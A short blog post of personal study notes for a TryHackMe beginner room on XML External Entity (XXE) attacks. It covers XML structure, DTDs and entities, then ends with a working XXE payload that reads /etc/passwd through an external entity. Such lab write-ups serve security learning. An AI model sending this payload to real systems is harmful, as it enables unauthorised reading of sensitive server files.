# TryHackMe: Complete Beginner (Supplements)

## XXE

### Deploy the VM

I think I’ve basically done a different version of this room…

Anyways, two types of XML External Entity (XXE) attacks:

* IN-BAND attacks are where the attacker receives an immediate response.
* OUT-OF-BAND (“blind”) attacks are when there is no immediate response and instead the attacker must receive the data indirectly (such as through a request to a second server under the attacker’s control).

### eXtensible Markup Language

Some things to remember about XML documents:

* Start with the standard prolog: `<?xml version="1.0" encoding="UTF-8"?>`. This is not *technically* compulsory, but some parsers will barf if it’s missing.
* Every XML document has one and *only* one root element.
* XML is case sensitive.

### DTD

The Document Type Definition defines/validates an XML document. For example, the DTD defined as

```dtd
<!DOCTYPE note [
	<!ELEMENT note (to,from,heading,body)>
	<!ELEMENT to (#PCDATA)>
	<!ELEMENT from (#PCDATA)>
	<!ELEMENT heading (#PCDATA)>
	<!ELEMENT body (#PCDATA)>
]>
```

validate the XML document

```xml
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE note SYSTEM "note.dtd">  
<note>  
	<to>falcon</to>  
	<from>feast</from>  
	<heading>hacking</heading>  
	<body>XXE attack</body>  
</note>
```

The root node is defined immediately after the DOCTYPE declaration, with each ELEMENT declaration taking the form `element_name (contained_data)`. `#PCDATA` stands for “printable character data.

The DTD can also define multiple ENTITY types — `&amp;` and similar.

```xml
<!DOCTYPE userInfo [
	<!ENTITY name "feast">
]>
<userInfo>
	<firstName>falcon</firstName>
	<lastName>&name;</lastName>
</userInfo>
```

Conveniently, DTD can be defined *in line*, and not just by included files.

These last two features are what we will leverage to attack applications that accept XML inputs.

### XXE Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
	<!ENTITY read SYSTEM 'file:///etc/passwd'>
]>
<root>&read;</root>
```

The SYSTEM directive allows us to include other files… Possibly quite sensitive ones, depending on the permissions of our webserver and how good the application’s input sanitization is.

- - - -

👤 Nathan Acks  
📅 December 9, 2021
